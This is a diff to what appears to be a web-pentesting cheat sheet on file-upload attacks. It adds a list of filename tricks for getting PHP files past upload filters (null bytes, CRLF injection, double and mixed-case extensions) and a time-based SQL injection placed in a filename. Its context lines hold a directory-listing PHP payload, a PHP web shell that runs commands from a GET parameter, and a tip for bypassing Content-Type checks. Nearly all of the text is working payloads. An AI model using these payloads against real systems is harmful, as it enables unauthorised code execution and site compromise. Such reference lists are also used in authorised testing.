@@ -729,8 +729,30 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 
 >bypass Bypass Content-Type checks by setting the value of the Content-Type header to: image/png , text/plain link
 [Content-Type wordlist:](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
+>پاشگر
+```
+file.php%20
+file.php%0a
+file.php%00
+file.php%0d%0a
+file.png.php
+file.png.Php5
+file.png.php
+file.png.pHp5
+file.php%00.png
+file.php\x00.png
+file.php%0a.png
+file.php%0d%0a.png
+flile.phpJunk123png
+file.png.jpg.php
+file.php%00.png%00.jpg
 >link to web shell
 ```
+>sql to file
+```
+sleep(10)-- -.jpg
+```
+
 <?php system($_GET['cmd']);?
 <?php system('pwd'); ?>
 ```
